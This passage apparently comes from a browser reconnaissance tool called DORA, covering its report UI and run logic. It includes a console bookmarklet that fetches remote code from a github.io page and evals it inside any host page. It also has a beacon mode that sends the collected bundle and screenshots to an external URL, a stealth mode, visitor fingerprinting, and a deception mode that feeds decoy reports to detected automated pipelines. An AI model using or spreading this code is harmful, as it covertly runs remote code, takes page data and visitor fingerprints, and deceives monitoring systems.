*{box-sizing:border-box;margin:0;padding:0}

.dr-panel h2{color:var(--grn);font-size:14px;letter-spacing:1px;border-left:3px solid var(--grn);
padding-left:8px;margin-bottom:8px}
.dr-panel h2 .tag{float:right;font-size:10px;color:var(--mut);border:1px solid var(--line);padding:1px 7px}

padding:3.5px 0;font-size:12px}
.dr-kv .k{color:var(--mut)} .dr-kv .v{text-align:right;word-break:break-all}
.ok{color:var(--grn)} .warn{color:var(--amb)} .bad{color:var(--red)} .info{color:var(--cyn)} .mag{color:var(--mag)}

#dora-root table{width:100%;border-collapse:collapse;font-size:12px}
#dora-root th{color:var(--mut);text-align:left;font-weight:normal;font-size:10.5px;
letter-spacing:1px;border-bottom:1px solid var(--line);padding:5px 7px;text-transform:uppercase}
#dora-root td{border-bottom:1px solid #122012;padding:6px 7px;vertical-align:top;word-break:break-word}
#dora-root button{background:#0d130d;border:1px solid var(--grn2);color:var(--grn);
font-family:var(--mono);font-size:11px;padding:5px 12px;cursor:pointer;letter-spacing:1px;margin:3px 4px 3px 0}
#dora-root button:hover{background:var(--grn);color:#000}
.dr-shot{border:1px solid var(--line);background:#000;cursor:zoom-in}
.dr-shot img{width:100%;display:block}
.dr-shot .cap{font-size:10.5px;color:var(--mut);padding:5px 7px;border-top:1px solid var(--line)}
#dora-light{position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:2147483600;display:none;
align-items:center;justify-content:center;cursor:zoom-out}
#dora-light img{max-width:96vw;max-height:94vh;border:1px solid var(--grn2)}
.st-ok{color:var(--grn)} .st-timeout{color:var(--amb)} .st-error{color:var(--red)} .st-denied{color:var(--mag)}
.dr-note{font-size:11px;color:var(--mut);margin-top:6px}
#dora-root pre{background:#000;border:1px solid var(--line);padding:10px;overflow:auto;
max-height:300px;font-size:11.5px;color:var(--grn2)}
</style>

  h+="<div class='dr-panel'><h2>EXPORT</h2><button id='dora-xjson'>&#x2B07; JSON BUNDLE</button><button id='dora-clear' style='border-color:var(--red);color:var(--red)'>&#x2715; CLOSE</button></div>";
  root.innerHTML=h;document.documentElement.appendChild(root);
  root.querySelector("#dora-xjson").addEventListener("click",function(){dl("dora-report.json",JSON.stringify({note:"synthetic decoy",score:score},null,2),"application/json");});
  root.querySelector("#dora-clear").addEventListener("click",function(){root.remove();});}

/* ================= RUNNER ================= */
var MODS=[["i01",i01],["i02",i02],["i03",i03],["i04",i04],["i05",i05],["i06",i06],["i07",i07],["i08",i08]];
function defsOf(mod){var o={};Object.keys(mod).forEach(function(k){if(k[0]==="_"||k==="t")return;
  o[k]={f:mod[k],t:mod.t||800};});return o;}
async function runAll(){
  for(var i=0;i<MODS.length;i++){var name=MODS[i][0];
    tlog("module "+name+" ("+MODS[i][1]._name+") …");
    R[name]=await runModule(defsOf(MODS[i][1]));
    var ok=0,to=0,er=0;Object.keys(R[name]._probes).forEach(function(p){var s=R[name]._probes[p].s;if(s==="ok")ok++;else if(s==="timeout")to++;else er++;});
    tlog("  "+name+": "+ok+" ok / "+to+" timeout / "+er+" err");
  }
  tlog("classification engine …");
  R.i09={classification:{s:"ok",v:classify(R)}};
  try{var _hits=(R.i02._probes.lattice&&R.i02._probes.lattice.v&&R.i02._probes.lattice.v.hits)||[];
    R.i09.classification.v.evidence.blinkEstimate=estimateBlinkVersion(_hits);}catch(e){}
  tlog("visitor memory (i=11) …");
  R.i09.visitorMemory={s:"ok",v:visitorMemory(R)};
  tlog("done. bundle ready.");
  return R;
}

/* ================= i=10 REPORT & UI ================= */
function kvRow(k,v,cls){return '<div class="dr-kv"><span class="k">'+esc(k)+'</span><span class="v '+(cls||"")+'">'+esc(v)+'</span></div>';}
function probeStatusCell(p){
  if(!p)return '<span class="st-error">null</span>';
  if(p.s==="ok")return '<span class="st-ok">ok</span>';
  if(p.s==="timeout")return '<span class="st-timeout">timeout</span>';
  if(p.s==="denied")return '<span class="st-denied">denied</span>';
  return '<span class="st-error">'+esc(p.e||"error")+'</span>';
}
function panel(title,tag,inner){return '<div class="dr-panel"><h2>'+esc(title)+' <span class="tag">'+esc(tag)+'</span></h2>'+inner+'</div>';}
function val(v){
  if(v===null||v===undefined)return '<span class="dr-note">null</span>';
  if(typeof v==="string")return esc(v.length>400?v.slice(0,400)+"…":v);
  return '<pre>'+esc(JSON.stringify(v,null,1).slice(0,1200))+'</pre>';
}
function modulePanel(idx,name,modName,Rb){
  var probes=Rb[idx]&&Rb[idx]._probes?Rb[idx]._probes:{};
  var inner='<div class="dr-grid">';
  Object.keys(probes).sort().forEach(function(p){
    var r=probes[p];
    inner+='<div>'+kvRow(p, r.s==="ok"?"":"", r.s==="ok"?"ok":(r.s==="timeout"?"warn":"bad"))+'<div style="margin:2px 0 8px 0">'+(r.s==="ok"?val(r.v):probeStatusCell(r))+'</div></div>';
  });
  inner+='</div>';
  return panel(name+" "+idx,modName,inner);
}
function buildUI(Rb){
  var c=Rb.i09.classification.v;
  var root=document.createElement("div");root.id="dora-root";
  var h='<h1>DORA // FIELD REPORT</h1><div class="sub">DEEP OBSERVATION &amp; RECON APPARATUS v1.0 · '+esc(location.href)+' · schema v'+Rb.meta.schema+'</div>';
  h+='<div id="dora-boot">'+LOG.map(function(l){return '<div><span class="t">['+l.t.toFixed(2).padStart(5)+'s]</span> '+esc(l.m)+'</div>';}).join("")+'</div>';
  /* score card */
  var riskCls=c.attack_surface.risk==="CRITICAL"?"bad":c.attack_surface.risk==="HIGH"?"warn":"ok";
  h+=panel("CLASSIFICATION — THE MAP","i=09",
    '<div class="dr-grid"><div>'+
    kvRow("system_type",c.system_type.best.t+" ("+c.system_type.best.c+"%)","info")+
    kvRow("attack surface",c.attack_surface.score+"/200 "+c.attack_surface.risk,riskCls)+
    kvRow("active vectors",c.attack_surface.vectors.length,"warn")+
    '</div><div><div class="dr-note">evidence:</div>'+val(c.system_type.best.e)+
    '<div class="dr-note" style="margin-top:6px">all candidates:</div>'+val(c.system_type.all)+'</div></div>'+
    '<h3 style="color:var(--cyn);font-size:12px;margin:10px 0 4px">VECTORS</h3>'+
    '<div>'+c.attack_surface.vectors.map(function(v){return '<span class="pill '+(v.indexOf("injection")>-1||v.indexOf("headless")>-1?"mag":"info")+'" style="margin:2px">'+esc(v)+'</span>';}).join("")+'</div>');
  /* neighbor map */
  var nm='<table><tr><th>origin</th><th>tier</th><th>reqs</th><th>alive</th></tr>';
  c.neighbor_map.neighbors.forEach(function(n){nm+='<tr><td>'+esc(n.origin)+'</td><td class="'+(n.tier==="cross-origin"?"warn":"ok")+'">'+esc(n.tier)+'</td><td>'+n.requests+'</td><td>'+(n.alive?"✓":"?")+'</td></tr>';});
  nm+='</table><h3 style="color:var(--cyn);font-size:12px;margin:10px 0 4px">WELL-KNOWN PATHS (same-origin HEAD)</h3><table><tr><th>path</th><th>status</th><th>content-type</th></tr>';
  (c.neighbor_map.wellKnown||[]).forEach(function(w){nm+='<tr><td>'+esc(w.p)+'</td><td class="'+(w.ok?"ok":"bad")+'">'+esc(String(w.status))+'</td><td>'+esc(w.ct||"")+'</td></tr>';});
  nm+='</table>';
  h+=panel("NEIGHBOR MAP","i=07 + i=09",nm);
  /* recommendations */
  h+=panel("RECOMMENDATIONS","top 5",c.recommendations.map(function(r,i){
    return '<div class="dr-kv"><span class="k">#'+(i+1)+'</span><span class="v" style="text-align:left">'+esc(r.r)+' <span class="dr-note">— '+esc(r.why)+'</span></span></div>';}).join(""));
  /* modules */
  h+=modulePanel("i00","BOOTSTRAP","",Rb);
  h+=modulePanel("i01","ENGINE & PARSER","",Rb);
  h+=modulePanel("i02","JS RUNTIME","lattice",Rb);
  h+=modulePanel("i03","SECURITY POSTURE","",Rb);
  h+=modulePanel("i04","FEATURE SURFACE","",Rb);
  h+=modulePanel("i05","SYSTEM & HARDWARE","",Rb);
  h+=modulePanel("i06","HOST APP RECON","key-names only",Rb);
  h+=modulePanel("i07","NETWORK POSITION","passive",Rb);
  /* gallery */
  var shots=[];
  try{Rb.i08._probes.tierA.v.tiles.forEach(function(t,i){shots.push({cap:"TIER-A tile @"+t.offset+" stripped:"+t.stripped.length,png:t.png});});}catch(e){}
  try{Rb.i08._probes.tierB.v.shots.forEach(function(s){if(s.png)shots.push({cap:"TIER-B "+s.selector,png:s.png});});}catch(e){}
  try{var tc=Rb.i08._probes.tierC.v;if(tc.png)shots.push({cap:"TIER-C text-tree ("+(tc.lines||0)+" lines)",png:tc.png});}catch(e){}
  if(shots.length){
    h+=panel("VISUAL RECORD","click to zoom",
      '<div class="dr-grid" id="dora-gallery">'+shots.map(function(s,i){
        return '<div class="dr-shot" data-i="'+i+'"><img src="'+s.png+'"><div class="cap">'+esc(s.cap)+'</div></div>';}).join("")+'</div>');
  }else{
    h+=panel("VISUAL RECORD","all tiers failed","<div class='dr-note'>foreignObject serialization unavailable in this context</div>");
  }
  /* status matrix */
  var st='<table><tr><th>module</th><th>probe</th><th>status</th></tr>';
  ["i01","i02","i03","i04","i05","i06","i07","i08"].forEach(function(m){
    var ps=Rb[m]&&Rb[m]._probes?Rb[m]._probes:{};
    Object.keys(ps).sort().forEach(function(p){st+='<tr><td>'+m+'</td><td>'+esc(p)+'</td><td>'+probeStatusCell(ps[p])+'</td></tr>';});
  });
  st+='</table>';
  h+=panel("PROBE STATUS MATRIX","timeout/err = signal",st);
  /* visitor memory */
  try{var vm=Rb.i09.visitorMemory.v;
    h+=panel("VISITOR MEMORY","i=11",
      kvRow("fingerprint hash",vm.fpHash,"info")+
      kvRow("visits (this browser)",String(vm.totalVisits))+
      kvRow("seen before",vm.seenBefore?"YES — returning visitor":"no — first contact",vm.seenBefore?"warn":"ok")+
      (vm.lastVisit?kvRow("last visit",new Date(vm.lastVisit.ts).toISOString()+" · score "+vm.lastVisit.score)+
      kvRow("drift",vm.drift.scoreDelta+" score / "+vm.drift.vectorDelta+" vectors / fp "+(vm.drift.vhashMatch?"stable":"CHANGED"),(Math.abs(vm.drift.scoreDelta)>10||!vm.drift.vhashMatch)?"warn":"ok"):"")+
      (vm.storageErr?kvRow("storage",vm.storageErr,"bad"):"")+
      '<div class="dr-note">localStorage[dora_visits_v1] — max 10 entries, this browser only, never leaves the device unless beaconed</div>');
  }catch(e){}
  /* watch mode */
  h+=panel("WATCH MODE","i=12 — catch lazy-loaded assets",
    '<div id="dora-watchlog" style="max-height:140px;overflow-y:auto;font-size:11.5px;background:#000;border:1px solid var(--line);padding:6px;margin-bottom:6px"><span class="dr-note">idle — SPAs load routes and APIs late; watch re-runs i=07 every 5s × 6 to catch them</span></div>'+
    '<button id="dora-watch">&#9654; START WATCH (6 × 5s)</button><button id="dora-watchstop">&#9632; STOP</button>');
  /* diff mode */
  h+=panel("DIFF MODE","i=13 — compare vs previous bundle",
    '<textarea id="dora-diffin" placeholder="paste previous DORA JSON bundle here" style="width:100%;height:80px;background:#000;border:1px solid var(--line);color:var(--txt);font-family:var(--mono);font-size:11px;padding:6px"></textarea>'+
    '<button id="dora-diffbtn">&#8646; DIFF AGAINST CURRENT RUN</button><div id="dora-diffout"></div>');
  /* link-mode loader */
  var _snip="javascript:(function(){fetch('https://franksx.github.io/Mirror/dora.html').then(r=>r.text()).then(t=>{var m=t.match(/<script>([\\s\\S]*)<\\/script>/);(0,eval)(m[1]);}).catch(e=>console.log('dora loader:',e))})()";
  h+=panel("LINK-MODE LOADER","paste into any console",
    '<div class="urlbox"><input readonly value="'+esc(_snip)+'"><button id="dora-cpsnip">COPY</button></div>'+
    '<div class="dr-note">fetches this file, eval&#39;s the payload in the HOST page context — full DOM access to whatever tab you&#39;re on. CSP without unsafe-eval will block it; degradation is graceful (partial bundle still resolves on window.DORA_RESULT).</div>');
  if(DECEIVE)h+=panel("DECEPTION MODE","ACTIVE","<div class='warn'>automated pipelines (webdriver / software-GPU signature) receive the synthetic decoy report. Real bundle is untouched on window.DORA_RESULT — decoy is visual only.</div>");
  if(BEACON)h+=panel("BEACON","ACTIVE","<div class='warn'>POST-run bundle dispatch to: "+esc(BEACON)+(BEACON_SHOT?" (+ first Tier-A tile)":"")+"</div>");
  /* export */
  h+='<div class="dr-panel"><h2>EXPORT</h2>'+
    '<button id="dora-xjson">⬇ JSON BUNDLE</button>'+
    '<button id="dora-xmd">⬇ MARKDOWN REPORT</button>'+
    '<button id="dora-xclip">⧉ COPY JSON</button>'+
    '<button id="dora-clear" style="border-color:var(--red);color:var(--red)">✕ CLOSE</button>'+
    '<div class="dr-note">deterministic output · timestamps only in meta · safe to diff across targets</div></div>';
  root.innerHTML=h;
  document.documentElement.appendChild(root);
  var light=document.createElement("div");light.id="dora-light";
  light.innerHTML='<img src="">';document.documentElement.appendChild(light);
  root.querySelectorAll(".dr-shot").forEach(function(el){
    el.addEventListener("click",function(){var img=shots[+el.getAttribute("data-i")];
      light.querySelector("img").src=img.png;light.style.display="flex";});
  });
  light.addEventListener("click",function(){light.style.display="none";});
  root.querySelector("#dora-xjson").addEventListener("click",function(){dl("dora-report.json",JSON.stringify(stableSortObj(Rb),null,2),"application/json");});
  root.querySelector("#dora-xmd").addEventListener("click",function(){dl("dora-report.md",buildMD(Rb),"text/markdown");});
  root.querySelector("#dora-xclip").addEventListener("click",function(){
    var b=root.querySelector("#dora-xclip");
    try{navigator.clipboard.writeText(JSON.stringify(stableSortObj(Rb)));b.textContent="✓ COPIED";}catch(e){b.textContent="clipboard blocked — use JSON button";}
    setTimeout(function(){b.textContent="⧉ COPY JSON";},1500);});
  root.querySelector("#dora-clear").addEventListener("click",function(){root.remove();light.remove();});
  root.querySelector("#dora-cpsnip").addEventListener("click",function(){cp(this);});
  root.querySelector("#dora-watch").addEventListener("click",function(){startWatch(root.querySelector("#dora-watchlog"));});
  root.querySelector("#dora-watchstop").addEventListener("click",function(){stopWatch();});
  root.querySelector("#dora-diffbtn").addEventListener("click",function(){
    var o=root.querySelector("#dora-diffout");
    try{var prev=JSON.parse(root.querySelector("#dora-diffin").value);o.innerHTML=diffHTML(prev,Rb);}
    catch(e){o.innerHTML='<span class="st-error">parse error: '+esc(e.message)+'</span>';}});
  var boot=document.getElementById("dora-boot"); boot.scrollTop=boot.scrollHeight;
}
function buildMD(Rb){
  var c=Rb.i09.classification.v;
  var md="# DORA Field Report\n\n";
  md+="**target:** "+location.href+"\n**tool:** dora v"+Rb.meta.v+" schema v"+Rb.meta.schema+"\n\n";
  md+="## Classification\n\n- system_type: **"+c.system_type.best.t+"** ("+c.system_type.best.c+"%)\n";
  md+="- attack_surface: **"+c.attack_surface.score+"/200 "+c.attack_surface.risk+"**\n";
  md+="- vectors: "+c.attack_surface.vectors.map(function(v){return "`"+v+"`";}).join(" ")+"\n\n";
  md+="## Neighbor Map\n\n| origin | tier | reqs |\n|---|---|---|\n";
  c.neighbor_map.neighbors.forEach(function(n){md+="| "+n.origin+" | "+n.tier+" | "+n.requests+" |\n";});
  md+="\n## Recommendations\n\n";
  c.recommendations.forEach(function(r,i){md+=(i+1)+". "+r.r+" — *"+r.why+"*\n";});
  md+="\n## Probe Status\n\n| module | probe | status |\n|---|---|---|\n";
  ["i00","i01","i02","i03","i04","i05","i06","i07","i08"].forEach(function(m){
    var ps=Rb[m]&&Rb[m]._probes?Rb[m]._probes:{};
    Object.keys(ps).sort().forEach(function(p){var r=ps[p];
      md+="| "+m+" | "+p+" | "+(r.s==="ok"?"ok":r.s+(" — "+(r.e||"")).slice(0,60))+" |\n";});
  });
  md+="\n## Raw JSON\n\n```json\n"+JSON.stringify(stableSortObj(Rb))+"\n```\n";
  return md;
}

/* ================= BOOTSTRAP EXECUTION ================= */
var resultPromise;
if(!HAS_DOC){
  tlog("no document — worker/paste-without-dom context; partial run (i02/i05 only)");
  resultPromise=(async function(){
    R.i02={_probes:{}};R.i05={_probes:{}};
    var d2=defsOf(i02);for(var k in d2)R.i02._probes[k]=await runProbe(d2[k].f,d2[k].t);
    var d5={nav:i05.nav,net:i05.net,tz:i05.tz};
    for(var k5 in d5)R.i05._probes[k5]=await runProbe(d5[k5],1000);
    return R;
  })();
}else{
  resultPromise=runAll().then(function(Rb){
    if(BEACON){var payload=stableSortObj(Rb);
      if(BEACON_SHOT){try{payload._shot=Rb.i08._probes.tierA.v.tiles[0].png;}catch(e){}}
      try{sendBeacon(BEACON,payload);tlog("beacon dispatched -> "+BEACON);}catch(e){tlog("beacon failed: "+e);}}
    var _auto=false;try{_auto=isLikelyAutomated(Rb.i09.classification.v);}catch(e){}
    if(STEALTH){tlog("stealth mode — no DOM insertion; bundle on window.DORA_RESULT");}
    else if(DECEIVE&&_auto){tlog("DECEPTION: automated pipeline detected — decoy report rendered; real bundle on DORA_RESULT");buildDecoy(Rb);}
    else{buildUI(Rb);}
    if(SELFTEST){dl("dora-selftest.json",JSON.stringify(stableSortObj(Rb),null,2),"application/json");}
    return Rb;
  }).catch(function(e){tlog("FATAL: "+e);if(HAS_DOC&&!STEALTH)buildUI(R);return R;});
}
try{
  Object.defineProperty(window,"DORA_RESULT",{get:function(){return resultPromise;}});
  Object.defineProperty(window,"DORA_LOG",{get:function(){return LOG;}});
}catch(e){}
if(typeof module!=="undefined"&&module.exports){module.exports={run:function(){return resultPromise;}};}
if(!STEALTH&&HAS_DOC)tlog("modes: ?dora-stealth (headless) · ?dora-selftest (auto-export) · ?dora-deceive (decoy for scrapers) · ?dora-beacon=<url> (+dora-beacon-shot) · window.DORA_RESULT -> Promise<bundle>");
})();
